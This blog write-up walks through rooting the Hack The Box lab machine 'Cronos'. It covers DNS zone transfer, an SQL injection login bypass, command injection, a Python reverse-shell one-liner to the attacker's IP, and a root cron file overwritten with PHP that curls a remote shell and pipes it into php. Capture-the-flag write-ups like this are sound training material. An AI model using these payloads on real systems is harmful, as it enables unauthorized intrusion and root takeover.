---
layout: post
title: HTB - Cronos Writeup
date: 2019-10-03
image: '/images/posts/htb/cronos/cronos.jpg'
categories: ["writeups"]
tags: ["writeups", "cronos", "htb"]
---

* Box: Cronos
  - Difficulty: Medium
  - Points: 30
  - Release: 22 Mar 2017
  - IP: 10.10.10.13


### Initial Enumeration

#### 1. Nmap Scanning

Starting with a scan of the target ip address:

`nmap -sC -sV -oA cronos.nmap 10.10.10.13`

<img src="/images/posts/htb/cronos/cronos1.jpg">

We see ports 22,53,80 open. First off let's load up the browser and take a look.

We see a default Apache2 page like this:

<img src="/images/posts/htb/cronos/cronos2.jpg">

Let's try and find some directories using GoBuster:

``gobuster dir -u http://10.10.10.13/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k``

<img src="/images/posts/htb/cronos/cronos3.jpg">

No results for the GoBuster. In the port scan we saw DNS open so let's nslookup and see what we can find out about the server.

<img src="/images/posts/htb/cronos/cronos4.jpg">

We got a domain, **cronos.htb**
We'll go ahead and add that into our hosts file and browse to it.

<img src="/images/posts/htb/cronos/cronos5.jpg">

<img src="/images/posts/htb/cronos/cronos6.jpg">

Running the GoBuster scan again for **cronos.htb** we see the "**robots.txt**" file is available but there is nothing of substance available.

<img src="/images/posts/htb/cronos/cronos7.jpg">

Let's try a zone transfer since port 53 is open and see if we can get any more information:

<img src="/images/posts/htb/cronos/cronos8.jpg">

The **admin.cronos.htb** looks interesting so let's add that into our hosts file as well so we can browse to it.

<img src="/images/posts/htb/cronos/cronos8.jpg">

<img src="/images/posts/htb/cronos/cronos9.jpg">

Nice! We got a login page, let's test a bypass using SQL injection.

``admin' or '1'='1``

Using the following [Pentest Blog Cheat Sheet](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)

<img src="/images/posts/htb/cronos/cronos10.jpg">

We got a **Net Tool v0.1** page. Perhaps this is also vulnerable to command injection?

Looks like it!

<img src="/images/posts/htb/cronos/cronos11.jpg">

Now that we confirmed command injection, we can simply use the below command to get a reverse shell in python.

I used [this](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) cheat sheet from PentestMonkey.

``python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.57",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'``

<img src="/images/posts/htb/cronos/cronos12.jpg">

We can look at our listener and confirm we got a shell.

Next we need to escalate our privileges.

### Privilege Escalation

After investigating the machine we don't have much luck enumerating.

Based on the name of this box, we take a look at **/etc/crontab**. Here we see something of interest:

<img src="/images/posts/htb/cronos/cronos13.jpg">

The last line there indicates a file named **artisan** is being executed by **root**.

<img src="/images/posts/htb/cronos/cronos14.jpg">

Pulling up the permissions for artisan shows our user has access to edit the file.
So let's simply make a script to have the server download a php reverse shell from my host and pipe it into php to execute.

<img src="/images/posts/htb/cronos/cronos15.jpg">

I used the following [PentestMonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) shell.

``<?php
system('curl http://10.10.14.57/reverse.php | php')
?>``

<img src="/images/posts/htb/cronos/cronos16.jpg">

Let's setup a web server locally and also ensure we have a listener ready to capture the shell.

<img src="/images/posts/htb/cronos/cronos17.jpg">

Wait a minute or so and the cronjob will execute the **artisan** file and we can see the nc listener now has a shell.

It isn't a full interactive shell but using the following post we can make it one:

[https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell](https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell)

We can find the root flag in /root/root.txt and the user flag at /home/noulis/user.txt.

<img src="/images/posts/htb/cronos/cronos18.jpg">
